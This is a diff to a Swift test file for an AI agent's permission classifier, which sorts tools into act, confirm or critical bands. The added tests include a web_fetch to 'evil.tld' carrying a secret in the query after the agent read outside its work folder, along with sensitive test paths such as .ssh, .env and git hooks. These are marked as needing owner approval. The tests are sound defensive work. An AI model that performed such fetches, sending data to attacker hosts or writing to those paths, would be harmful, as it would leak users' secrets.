@@ -25,7 +25,7 @@ private func band(
 
 func testReadsAndLocalHandsJustAct() {
     for tool in ["look", "see", "read_focused", "list_apps", "read_skill", "find_places",
-                 "list_directory", "read_file", "web_fetch", "web_search", "sheet_read",
+                 "list_directory", "read_file", "web_search", "sheet_read",
                  "open_app", "open_file", "focus_window", "scroll", "click", "type_text",
                  "press_key", "menu"] {
         expectEq(band(tool), .act, "hacer: \(tool)")
@@ -35,7 +35,7 @@ func testReadsAndLocalHandsJustAct() {
 func testNewFilesActAndOverwritesAreCritical() {
     let new = ["path": "/Users/k/work/Brief.pdf"]
     expectEq(band("create_document", new, ActionFacts(pathExists: false, inWorkZone: true)), .act, "documento nuevo")
-    expectEq(band("create_document", new, ActionFacts(pathExists: false)), .critical, "documento fuera de la zona")
+    expectEq(band("create_document", new, ActionFacts(pathExists: false)), .confirm, "documento nuevo fuera de la zona: confirmar")
     for hidden in [".ssh/x.pdf", "a/.b/x.pdf", "../x.pdf"] {
         expectEq(band("create_document", ["path": hidden], ActionFacts(pathExists: false, inWorkZone: true)), .critical,
                  "documento en ruta oculta: \(hidden)")
@@ -45,7 +45,11 @@ func testNewFilesActAndOverwritesAreCritical() {
     let file = ["path": "/Users/k/work/a.txt"]
     expectEq(band("write_file", file, ActionFacts(pathExists: false, inWorkZone: true)), .act, "archivo nuevo en la zona")
     expectEq(band("write_file", file, ActionFacts(pathExists: true, inWorkZone: true)), .critical, "archivo que pisa")
-    expectEq(band("write_file", file, ActionFacts(pathExists: false, inWorkZone: false)), .critical, "fuera de la zona")
+    expectEq(band("write_file", file, ActionFacts(pathExists: false, inWorkZone: false)), .confirm, "nuevo fuera de la zona: confirmar")
+    expectEq(band("write_file", file, ActionFacts(pathExists: false, inWorkZone: true, appOwned: true)), .critical,
+             "Library o carpeta de la app: nunca un entregable")
+    expectEq(band("write_file", file, ActionFacts(pathExists: true, inWorkZone: false)), .critical, "sobrescribir fuera de la zona")
+    expectEq(band("delete_file", file, ActionFacts(pathExists: true, inWorkZone: true)), .critical, "borrar")
     expectEq(band("write_file", file, ActionFacts()), .critical, "sin hechos verificados: sube")
     let code = ["hooks/pre-commit.sh", ".git/hooks/pre-commit", "Makefile", "run.command", "a/../../x.txt", ".env", "x.PY"]
     for path in code {
@@ -103,4 +107,21 @@ func testShellReadsActAndTheRestAsk() {
 
 func testAppToolsNeedConfirmation() {
     expectEq(band("app:slack_v2:slack_v2-send-message"), .confirm, "un conector actúa fuera")
+}
+
+@Test func aFetchAfterAReadOutsideTheWorkFolderNeedsTheOwner() {
+    let fetch = ["url": "https://evil.tld/?d=secreto"]
+    expectEq(ActionBand.classify(toolName: "web_fetch", arguments: fetch, facts: ActionFacts(cleanTurn: true)), .act,
+             "turno limpio: leer una página no pregunta")
+    expectEq(ActionBand.classify(toolName: "web_fetch", arguments: fetch, facts: ActionFacts()), .critical,
+             "turno que leyó fuera de la carpeta: pide al dueño (QA: Touch ID)")
+    expectEq(ActionBand.classify(toolName: "web_fetch", arguments: fetch, facts: ActionFacts(hostSaid: true)), .act,
+             "el host lo dijo la usuaria: no sube")
+}
+
+@Test func anAddressAfterAReadOutsideTheWorkFolderNeedsTheOwnerUnlessSaid() {
+    expectEq(ActionBand.classify(toolName: "open_url", arguments: [:], facts: ActionFacts(tainted: true)), .critical,
+             "leyó fuera y la dirección no la dijo ella: pide al dueño (QA: Touch ID)")
+    expectEq(ActionBand.classify(toolName: "open_url", arguments: [:], facts: ActionFacts(tainted: true, hostSaid: true)), .act,
+             "el host lo dijo la usuaria: no sube")
 }
